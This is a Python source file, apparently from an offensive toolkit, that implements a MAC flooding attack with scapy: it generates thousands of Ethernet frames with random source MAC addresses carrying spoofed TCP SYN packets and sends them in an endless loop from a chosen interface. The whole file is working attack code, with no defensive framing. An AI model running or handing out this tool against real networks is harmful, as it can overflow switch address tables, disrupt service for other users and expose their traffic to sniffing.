#! /usr/bin/python

from scapy.all import *
import sys
import colors
import time


class MACFlood(object):

    def __init__(self, interface):
        self.target_ip = RandIP("*.*.*.*")

        if interface is not None:
            self.interface = interface
        else:
            colors.error('Please provide interface from which attack...')
            sys.exit(1)

        self.packet_list = []
        self.number_of_packets = 0

    def generatePacket(self):
        """
        Generates a list of 10000 scapy packets so they can be sent super fast.
        """
        for _ in range(1, 10000):
            # Since in the Source Adress field the first bit (I/G group bit) is
            # reserved, ensure that it is set to 0
            srcMac = str(RandMAC())
            srcMac = srcMac[:1] + "0" + srcMac[2:]

            ETHER_PACKET = Ether(src=srcMac, dst=RandMAC("ff:ff:ff:ff:ff:ff"))
            IP_PACKET = IP(src=RandIP(), dst=RandIP())
            # Simulate a TCP SYN Packet
            TCP_PACKET = TCP(dport=80, flags="S",
                             options=[('Timestamp', (0, 0))])
            PKT = ETHER_PACKET/IP_PACKET/TCP_PACKET
            self.packet_list.append(PKT)

    def sendPackets(self):
        """
        Sends the generated packets to the destination
        """
        s = conf.L2socket(iface=self.interface)
        print('[+] Sending 9999 packets')
        for pkt in self.packet_list:
            s.send(pkt)
        self.number_of_packets = self.number_of_packets + 9999
        print('[+] Packets sent: {}'.format(self.number_of_packets))

    def attack(self):
        self.generatePacket()

        while True:
            self.sendPackets()

    def startAttack(self):

        try:
            colors.info('MAC Flooding Attack on: {}'
                        .format(self.interface))

            colors.success('MAC Flooding Attack started, press CTRL+C to '
                           'stop...')

            t1 = time.time()

            self.attack()

        except KeyboardInterrupt:
            t2 = time.time()
            colors.success('Completed in time: {}'.format(t2-t1))
